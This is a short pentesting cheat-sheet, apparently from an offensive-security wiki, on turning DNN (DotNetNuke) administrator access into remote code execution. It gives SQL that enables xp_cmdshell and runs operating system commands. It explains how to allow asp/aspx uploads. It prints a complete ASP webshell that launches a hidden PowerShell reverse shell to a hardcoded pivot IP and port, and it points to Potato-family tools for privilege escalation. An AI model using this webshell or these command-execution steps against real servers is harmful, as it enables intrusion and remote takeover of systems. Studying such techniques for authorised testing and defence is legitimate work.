
If you enter as **administrator** in DNN it's easy to obtain RCE.

## Via SQL

A SQL console is accessible under the `**Settings**` page where you can enable `**xp_cmdshell**` and **run operating system commands**.

Use these lines to enable `**xp_cmdshell**`:

```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```

And press **"Run Script"** to run that sQL sentences.

Then, use something like the following to run OS commands:

Copy

```
xp_cmdshell 'whoami'
```

### Via ASP webshell

In `Settings -> Security -> More -> More Security Settings` you can **add new allowed extensions** under `Allowable File Extensions`, and then clicking the `Save` button.

Add `**asp**` or `**aspx**` and then in `**/admin/file-management**` upload an **asp webshell** called `shell.asp` for example.

For instance:

```
<%
Dim command, shell, ip, port
ip = "172.16.8.120"   ' <-- Pivot IP inside 172.16.8.0/24
port = 4444           ' <-- Port forwarded from pivot to Kali

Set shell = CreateObject("WScript.Shell")
Set command = shell.Exec("cmd.exe /c powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('" & ip & "'," & port & ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$r=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($r,0,$r.Length);$s.Flush()}""")
%>
```

Then access to `**/Portals/0/shell.asp**` to access your webshell.

### Privilege Escalation

You can **escalate privileges** using the **Potatoes** or **PrintSpoofer** for example.